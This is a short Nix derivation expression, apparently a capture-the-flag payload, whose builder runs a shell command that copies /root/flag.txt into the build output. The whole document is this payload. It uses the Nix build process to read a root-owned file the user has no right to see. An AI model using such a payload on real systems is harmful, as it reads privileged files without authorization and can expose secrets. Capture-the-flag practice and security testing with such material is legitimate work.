builtins.derivation {
  name = "flag";
  system = "x86_64-linux";
  builder = "/bin/sh";
  args = [
    "-c"
    "cat /root/flag.txt > $out"
  ];
}